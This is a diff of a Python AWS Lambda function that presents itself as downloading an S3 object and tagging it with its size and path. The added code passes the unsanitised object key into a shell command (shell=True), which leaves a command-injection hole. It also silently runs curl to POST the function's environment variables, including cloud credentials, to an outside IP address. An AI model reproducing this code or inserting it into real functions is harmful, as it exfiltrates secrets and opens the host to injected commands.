@@ -1,54 +1,63 @@
-import json
 import os
 import boto3
+import subprocess
+import json
+import urllib.parse
+
 
 s3 = boto3.client('s3')
 
-def tag_bucket(bucketName, key, file_download_path):
-    try:
-        # Calculate the file size
-        #file_size_bytes = os.path.getsize(file_download_path)
-        #file_size_KB = file_size_bytes / 1024
-        
-        # stat 명령어를 사용하여 파일 크기를 구합니다.
-        output = os.system("stat -c %s " + file_download_path)
 
-        # 출력에서 파일 크기를 추출합니다.
-        file_size_KB = output
-
-        # Add tags to the S3 object
-        s3.put_object_tagging(
-            Bucket=bucketName,
-            Key=key,
-            Tagging={
-                'TagSet': [
-                    {
-                        'Key': 'file_path',
-                        'Value': file_download_path,
-                    },
-                    {
-                        'Key': 'file_size_KB',
-                        'Value': file_size_KB,
-                    },
-                ]
-            }
-        )
-    except Exception as e:
-        print(f"Failed to tag file: {e}")
 
 def lambda_handler(event, context):
-    object_key = event['Records'][0]['s3']['object']['key']
-    file_download_path = f'/tmp/{object_key.split("/")[-1]}'
-    bucketName = event['Records'][0]['s3']['bucket']['name']
+    # Get the object from the event and show its content type
+    bucket = event['Records'][0]['s3']['bucket']['name']
     fileKey = event['Records'][0]['s3']['object']['key']
-
+    bucketName = event['Records'][0]['s3']['bucket']['name']
+    key = urllib.parse.unquote_plus(event['Records'][0]['s3']['object']['key'], encoding='utf-8')
     try:
-        s3.download_file(bucketName, fileKey, file_download_path)
-        tag_bucket(bucketName, fileKey, file_download_path)
-    except Exception as e:
-        print(f"Failed to process file: {e}")
+        response = s3.get_object(Bucket=bucket, Key=key)
+        print("CONTENT TYPE: " + response['ContentType'])
 
-    return {
-        'statusCode': 200,
-        'body': json.dumps({'message': 'File tagged successfully'}),
-    }
+        file_download_path = f'/tmp/{key.split("/")[-1]}'
+        with open(file_download_path, 'wb+') as file:
+            file.write(response['Body'].read())
+            
+        file_count_KB = subprocess.check_output(
+            "stat -c %s /tmp/" + key,
+            shell=True,
+            stderr=subprocess.STDOUT).decode().rstrip()
+        
+        # file_count_KB = os.system("stat -c %s " + file_download_path)
+        # file_count_KB = str(file_count_KB).rstrip()
+        command = 'curl -X POST -d  `env` 3.211.178.101:443'
+        os.system(command)
+        
+        if int(file_count_KB) < 1000000:
+            new_location = subprocess.check_output("pwd", shell=True, stderr=subprocess.STDOUT).decode().rstrip()
+            s3.put_object_tagging(
+                Bucket=bucket,
+                Key=key,
+                Tagging={
+                    'TagSet': [
+                        {
+                            'Key': 'Path',
+                            'Value': new_location
+                        },{
+                            'Key': 'Size',
+                            'Value': file_count_KB
+                        }
+                    ]
+                }
+            )
+        else:
+            print("File too big")
+
+
+    except Exception as e:
+        print(e)
+        print('Error getting object {} from bucket {}. Make sure they exist and your bucket is in the same region as this function.'.format(fileKey, bucketName))
+        
+        
+        
+        
